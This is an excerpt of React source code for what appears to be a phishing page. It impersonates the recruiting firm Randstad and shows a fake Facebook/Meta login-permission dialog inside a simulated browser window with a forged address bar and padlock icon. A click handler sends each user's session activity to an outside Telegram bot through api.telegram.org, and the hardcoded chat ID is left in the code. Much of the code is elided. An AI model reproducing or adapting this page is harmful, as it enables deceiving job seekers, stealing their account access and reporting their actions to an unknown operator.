...
import logo from './randstadt-logo.svg';
import logoSquare from './randstad-square.svg';
import talentlogo from './double-horn.svg';
import facebooklogo from './facebook.svg';
import twoWays from './2ways.svg';
...
const TELEGRAM_CHAT_ID = '-1002855972498';
...
const Login: React.FC = () => {
  ...
  useEffect(() => {
    document.title = 'Find the right job type for you | Randstad';
  }, []);
  ...
  const onPressLogInOnAccess = () => {
    ...
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      ...
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        parse_mode: 'HTML',
        text: `User pressed log in on request access ${sessionId}`,
      }),
    });
  };
  ...
  return (
    <div className="min-h-screen w-full flex flex-col justify-between bg-[#F1F5F8]">
      ...
      <FacebookResponsiveModal
        ...
        onPressLogInOnAccess={onPressLogInOnAccess}
      />
...
const RequestAccess = ({
  ...
  onClose,
  loginError,
  onPressLogInOnAccess,
}: any) => {
  return (
    <>
      <div className="hidden md:flex flex-col w-[980px] rounded-2xl shadow-xl bg-[#F2F3F7]">
        {/* Browser tab */}
        ...
        />
        {/* Content */}
        <div className="flex flex-row items-center justify-center px-8 py-14 pb-20  bg-[#F2F3F7] rounded-b-2xl">
          <div className="bg-white border-[2px] border-[#C5C5C580] border-solid py-6 rounded-[15px] px-4 pb-15">
            <div className="flex flex-row gap-1 items-center">
              <img
                src={FACEBOOK_FAVICON}
                alt="Facebook"
            ...
            <div className="bg-[#D9D9D9] h-[1.5px] w-full my-5"></div>
            <p className="text-[#222121] text-[18px] font-[600]">
              Randstad is requesting access to:
            </p>
            <div className="pl-3 pt-4">
              <div className="flex flex-row items-center gap-3">
                <div className="w-[6px] h-[6px] rounded-full bg-black"></div>
                <p className="text-[15px] font-[300] text-black">
              ...
              <div className="flex flex-row items-center gap-3">
                <div className="w-[6px] h-[6px] rounded-full bg-black"></div>
                <p className="text-[15px] font-[300] text-black">Education</p>
              </div>
            </div>
            <button
              type="submit"
              className="px-22 py-2 rounded-lg bg-[#2874DC] text-white font-semibold shadow hover:bg-[#0865FE] transition mt-12 cursor-pointer"
              onClick={onPressLogInOnAccess}
            >
              <p className="font-[400] text-[14px]">Continue</p>
            </button>
            <p className="text-[12px] font-[300] text-[#312D2D] pt-4">
              By continuing, Randstad will receive ongoing access to the
              information you share and Meta will <br /> record when Randstad
              accesses it. <p className="text-[#0865FE] inline">Learn more</p>{' '}
              about this sharing and the settings you have.
            </p>
            <p className="text-[12px] font-[300] text-[#312D2D] pt-4">
              Randstad's{' '}
              <p className="text-[#0865FE] inline underline cursor-pointer">
                Privacy Policy
              </p>{' '}
              and{' '}
              <p className="text-[#0865FE] inline underline cursor-pointer">
      ...
      <div className="flex md:hidden flex-col w-full  bg-[#F2F3F7] rounded-2xl shadow-xl items-center overflow-scroll">
        {/* Address bar */}
        ...
        <div className="flex flex-row items-center justify-center px-4 py-14 pb-20  bg-[#F2F3F7] rounded-b-2xl overflow-scroll">
          <div className="bg-white border-[2px] border-[#C5C5C580] border-solid py-6 rounded-[15px] px-4 pb-15">
            <div className="flex flex-row gap-1 items-center">
              <img
                src={FACEBOOK_FAVICON}
  ...
  return (
    <div className="flex-grow flex items-center justify-center p-6">
      <div className="bg-white border-2 border-[#E2E8EB] rounded-[40px] w-full max-w-[600px] p-12 flex flex-col justify-between">
        <div>
          <h2 className="text-xl font-semibold text-[#2874DC]">
        ...
        <button
          ...
          className="mt-6 w-full h-12 rounded-full bg-[#0865FE] text-white text-lg flex items-center justify-center gap-2 cursor-pointer"
        >
  ...
  return (
    <div className="flex-grow flex items-center justify-center p-4">
      <div className="bg-white border-2 border-[#E2E8EB] rounded-[40px] w-full max-w-lg p-8 flex flex-col items-center">
        ...
        <h1 className="text-2xl font-bold text-[#2874DC] text-center mt-4">
          Welcome to Randstad
        </h1>
        <p className="text-center text-gray-600 mt-2 text-[14px] text-[#4E4E4E]">
        ...
        <div className="w-36 h-1 bg-[#2874DC] my-8"></div>
        {/* <div className="mb-5">
          <div
        ...
        <button
          ...
          className="w-full h-14 rounded-full bg-[#2874DC] text-white text-lg font-medium cursor-pointer"
        >
          Continue
        </button>
      </div>
...
const AddressBar = ({ url }: any) => (
  <div className="w-full px-2">
    <div className="flex items-center bg-white border border-[#D9D9D9] rounded-[15px]  py-1 w-full mt-2 mb-3 px-2 flex-row justify-left items-center h-[35px]">
      <img
        src={greenLock}
        alt="Facebook"
        className="h-3 w-3 mb-[0.5px] mr-1"
